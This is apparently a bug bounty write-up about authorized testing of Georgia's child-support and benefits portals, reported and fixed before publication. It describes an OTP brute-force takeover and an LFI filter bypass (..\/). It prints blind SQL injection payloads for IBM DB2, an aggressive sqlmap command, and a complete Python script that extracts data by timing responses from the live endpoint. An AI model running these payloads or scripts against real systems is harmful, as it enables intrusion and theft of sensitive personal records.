# The Devil Went Down to Georgia

- **Source URL:** https://sirleeroyjenkins.medium.com/the-devil-went-down-to-georgia-how-i-made-60k-hacking-the-dhs-5401fe833c58
- **Fetched from:** https://sirleeroyjenkins.medium.com/feed
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14994 (id 14994)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Sometime near the end of 2023 I was invited to The Georgia Department of Human Services private bug bounty program on Hackerone through an IRL connection. Sadly their private bug bounty program is now shut down, but while it existed it was one of the best programs I’ve ever participated in. Very few hackers were invited to this private program, so competition was low, but bounties were very high and response times were fast. Basically a bug bounty hunter’s dream.

This writeup is going to detail how I found 3 critical issues that earned me $60,000 in bug bounties from them and could’ve let me dump the records of millions of Georgians.

The program’s scope covered two of Georgia’s public-facing portals:

- **dcssportal.ga.gov -** the Division of Child Support Services portal, where parents apply for and manage child support.
- **m.gateway.ga.gov -** the mobile benefits portal where residents apply for SNAP, Medicaid, and other assistance.

Between them, they handled social security numbers, income records, benefits data, and custody details for millions of residents.

### **Round 1: OTP brute-force Account Takeover on the Mobile Benefits Portal**

My very first report on the program was a duplicate with no bounty paid. Painful, but that’s where this story starts. I’m still going to explain the finding because it was valid and impactful and couldve resulted in account takeover of any user whose username or email you know.

This one’s a pretty simple and common one, and was caused due to a lack of rate-limiting on the password reset endpoint. When a user on the mobile benefits portal requested a password reset, the site emailed them a 6-digit OTP. The OTP expired after 10 minutes, but the OTP verification endpoint had no rate limiting so it could be brute forced. The reproduction steps were simple:

1. Trigger a password reset for the victim account
2. Attempt to solve the OTP with a random code , Intercept the API request to verifyEmail and send it to Burp Intruder
3. Fire Intruder at the OTP parameter with 6-digit numbers 000000–999999 at 100 threads
4. The correct pin is always found before the 10 minute timer expires, and the token you get back completes the password reset resulting in account takeover

*Timeline:*

- *Dec 29, 2023: Reported*
- *Jan 1, 2024: Closed as Duplicate*

### Round 2: LFI on the Mobile Benefits Portal

So my first report got closed as a dupe, but that wasn’t going to stop me! Three hours later on the same day, I was back on the same portal, and this time I found something nobody else had seen.

I started looking at what normal logged in users could actually do on the mobile portal. Since registration was open to the public, I created an account and started exploring the various functionalities of the application. Eventually , I discovered some functionality that allowed users to upload documents for verification. Once a user uploaded their own documents, they could re-download them from the portal which triggered a request to the following API endpoint:

POST /api/documentscan/fetchDocByLocalName

{

"filename": "\<filename>"

}

The endpoint took a single json parameter: filename .In a normal download request this parameter contained the filename of the user’s uploaded document, and the API returned the file contents as base64 . This seemed like it would be an easy local file reading issue, so I tried setting the filename to a different file:

So I tried that typical path traversal/LFI payload to prove reading the local passwd file and was given a 403 Forbidden response. It turned out the developers had already considered this , and attempted hardening the endpoint with filters against path traversals and local file reading, blocking payloads like ../

Eventually I was able to bypass this by confusing the filter with the payload ..\/ instead. The JSON parser turned every \/ into / while bypassing the filter.

The response to the request contained the base64 encoded contents of the passwd file as seen in the POC gif below:

This issue was immediately considered critical severity, because not only could it read system files, it could also read other users’ uploaded files , including verification documents for benefits applications with tons of PII and PHI.

*Timeline:*

- Dec 29, 2023: Reported
- Jan 5, 2024: Triaged
- Jan 5, 2024: $15,000 bounty awarded
- Jan 10, 2024: Dev teams confirms the fix

### Round 3: Blind SQL Injection in the Child Support Portal

After I had thoroughly pwned the Mobile Benefits portal, I turned my attention to the other portal in scope. The Division of Child Support Services portal. This system handled child support cases and contained extremely sensitive information such as custody details and social security numbers.

I started by exploring all the unauthenticated functionalities of the application, starting with the registration and reset flows. In order to create an account, the application first performs a member lookup to see if the registering user is allowed to. The portal checks whether you actually exist in the state’s child support system before it lets you sign up. Makes sense: you can’t manage a child support case unless you have one.

The lookup happens through a single API call that looks like this:

POST /api/public/member

{

"firstname": "john",

"lastname": "doe",

"ssn": "123456789"

}

Now, I’m not saying I knew the ssn field was going into a database. But I’ve been doing this long enough to know that a field like that doesn’t just disappear into thin air. Somewhere behind it, a query was running. Only one way to find out.

I sent the classic:

POST /api/public/member

{

"firstname": "john",

"lastname": "doe",

"ssn": "**1 OR 1=2--**"

}

The response came back instantly , an error after \~100 milliseconds.

Then I sent:

POST /api/public/member

{

"firstname": "john",

"lastname": "doe",

"ssn": "**1 OR 1=1--**"

}

And this one took **much** longer. A full ten seconds, where the first request only took a tenth of one. Same request, same endpoint, only the logic flipped. The database was actually evaluating my input, and the difference between true and false was visible with time delays.

So I saved the full request and handed it to sqlmap, running it with two important flags:

sqlmap -r member.req -p ssn **-level 5 -risk 3**

Most people run sqlmap at its defaults, which never even tries heavy queries. Default sticks to quick payloads, gets nothing, and gives up. level=5 forces it to probe aggressively, and risk=3 unlocks its most dangerous test category: heavy-query time-based payloads, built to make the database work for seconds when the injection is real.

It worked. sqlmap came back with the confirmation that the ssn parameter was vulnerable to time-based blind SQL injection with a heavy query, and the backend DBMS is IBM DB2.

The heavy query sqlmap uses looks like this:

"ssn": "(SELECT COUNT(\*) FROM (SELECT COUNT(\*) FROM SYSIBM.SYSTABLES AS T1, SYSIBM.SYSTABLES AS T2, SYSIBM.SYSTABLES AS T3) AS TEMP)”

SYSIBM.SYSTABLES is DB2’s system catalog , the table that lists every other table in the database. That payload joins it to itself three times, creating a Cartesian product that explodes exponentially: *rows × rows × rows*, then it counts them all. A normal request returned in about 120 milliseconds. With that payload? Thirty seconds. No errors, no output, just time. Time-based blind means the response never contains data; the only channel you get is time itself.

I wrote it up and submitted. The triager hit me with the classic: “Show us actual data extraction, not just a delay.”

Fair enough. I had demonstrated a real injection but not any real impact yet.So I built a data exfiltration script that used the same exact heavy query and weaponized it into a true/false oracle. DB2 exposes the current database name through a system variable called CURRENT SERVER and SUBSTR() reads it one character at a time, for example:

“ssn”: “(SELECT COUNT(\*) FROM (SELECT COUNT(\*) FROM SYSIBM.SYSTABLES AS T1, SYSIBM.SYSTABLES AS T2, SYSIBM.SYSTABLES AS T3 WHERE (SELECT CASE WHEN SUBSTR(CURRENT SERVER, 1, 1) = ‘D’ THEN 1 ELSE 0 END FROM SYSIBM.SYSDUMMY1) = 1) AS TEMP)"

In the above query, if the first character of the database name is D, the heavy query runs and the response crawls. Anything else, and it comes back instantly. A true/false oracle, and with a true/false oracle you can brute-force anything in the database!

Character by character, thirty second responses for each valid character:

D → slow. B → slow. P → slow. 5 → slow.

DBP5. The database gave up its name one character at a time.

This was the full script that automated the whole thing. It tested every printable character at every position until it bruteforced the entire DB name with response times:

import requests

import time

import string

# URL and headers for the HTTP request

url = "https://api-dcssportal.ga.gov/api/public/member"

headers = {

"Content-Type": "application/json"

}

# List of characters to iterate over (lowercase, uppercase, numbers)

char\_list = (

string.ascii\_lowercase + # 'a-z'

string.ascii\_uppercase + # 'A-Z'

string.digits + # '0-9'

"\_-.$#@%^&\*()+=:/\\'\"!\[\]{}\~|?" # Special characters to test

)

# Function to send the request and return response time

def send\_request(position, character):

# SQLi payload for the specific character at the given position

payload = f"(SELECT COUNT(\*) FROM (SELECT COUNT(\*) FROM SYSIBM.SYSTABLES AS T1, SYSIBM.SYSTABLES AS T2, SYSIBM.SYSTABLES AS T3 WHERE (SELECT CASE WHEN SUBSTR(CURRENT SERVER, {position}, 1) = '{character}' THEN 1 ELSE 0 END FROM SYSIBM.SYSDUMMY1) = 1) AS TEMP)"


# JSON data with the SQLi injected

data = {

"firstname": "doe",

"lastname": "johnson",

"ssn": payload

}


# Measure the time it takes to get a response

start\_time = time.time()

response = requests.post(url, headers=headers, json=data)

end\_time = time.time()


# Return the response time

return end\_time - start\_time

# Function to discover the database name

def discover\_db\_name(max\_length=10):

db\_name = ""


for position in range(1, max\_length + 1):

found = False


for character in char\_list:

# Send request for current position and character

response\_time = send\_request(position, character)

print(f"Testing position {position} with character '{character}': Response time = {response\_time:.2f}s")


# If the response time is significantly longer, we assume it's the correct character

if response\_time > 5:

db\_name += character

print(f"Found character '{character}' for position {position}")

found = True

break


# If no character was found (end of DB name), stop

if not found:

print(f"End of DB name detected at position {position}.")

break


return db\_name

# Start the discovery process

if \_\_name\_\_ == "\_\_main\_\_":

print("Starting DB name discovery...")

db\_name = discover\_db\_name(max\_length=10) # Adjust max\_length if necessary

print(f"Discovered DB Name: {db\_name}")

*Timeline:*

- *Sep 30, 2024: Reported*
- *Oct 10, 2024: Triager requests data extraction poc*
- *Oct 11, 2024: Python poc submitted*
- *Oct 24, 2024: $25,000 bounty awarded*
- *July 28, 2025: Report marked Resolved*

### Round 4: Same Bug, Different Endpoint

About a month later, I was still mapping the DCSS API surface, I found it again, this time on the password reset endpoint:

POST /api/public/selfResetPwd

Since the ssn field was previously vulnerable to injection, I kept looking for other API requests that also contained this parameter. This request also happened to contain an ssn field. So I tried the same heavy query as before and got the same thirty second response. Same root cause as Round 3, just a different endpoint and a different code path. Realistically I wasn’t expecting another bounty for it. I just reported it mostly for tracking, because a separate endpoint can mean separate remediation, and I figured the team would want to know both places were broken.

So I was genuinely shocked when, five days later, another bounty hit. Slightly less than the first one, but I’m not about to complain about *twenty grand* for re-running a script i’d already written.

*Timeline:*

- *Oct 28, 2024: Reported*
- *Nov 2, 2024: Triaged and $20,000 bounty awarded*
- *Jul 28, 2025: Report marked as resolved*

### The End

The program is shut down now. Georgia patched the portals and closed the endpoints. But for about a year, the devil went down to Georgia, and came home with $60,000.

All findings were reported through the official Georgia DHS program on Hackerone and were fixed before publication.

I’ve now quit doing bug bounties and am focused on my career at Open Security. If you want to work with us, reach out at [https://opensecurity.com/contact/](https://opensecurity.com/contact/)
